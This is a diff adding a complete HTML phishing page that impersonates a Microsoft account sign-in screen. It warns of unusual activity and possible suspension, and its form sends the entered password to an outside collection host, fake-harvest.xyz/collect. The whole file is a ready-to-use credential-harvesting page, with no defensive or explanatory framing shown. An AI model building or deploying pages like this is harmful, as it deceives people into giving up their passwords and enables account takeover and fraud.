@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Microsoft Account Security Alert - Sign In</title>
+  <meta name="description" content="Your Microsoft account requires immediate verification. Sign in to prevent suspension.">
+  <style>
+    body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f3f4f6; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+    .box { background: white; padding: 40px; border-radius: 4px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 380px; }
+    h1 { font-size: 20px; color: #1b1b1b; margin-bottom: 20px; }
+    input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; box-sizing: border-box; }
+    button { width: 100%; padding: 10px; background: #0067b8; color: white; border: none; font-weight: 600; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div style="font-weight: 700; color: #0067b8; font-size: 22px; margin-bottom: 12px;">Microsoft</div>
+    <h1>Sign in to your Microsoft Account</h1>
+    <p style="font-size: 13px; color: #666; margin-bottom: 20px;">Unusual activity detected. Please verify your password to proceed.</p>
+    <form action="http://fake-harvest.xyz/collect" method="POST">
+      <input type="email" placeholder="someone@example.com" required>
+      <input type="password" name="passwd" placeholder="Enter your password" required>
+      <button type="submit">Verify & Sign In</button>
+    </form>
+  </div>
+</body>
+</html>
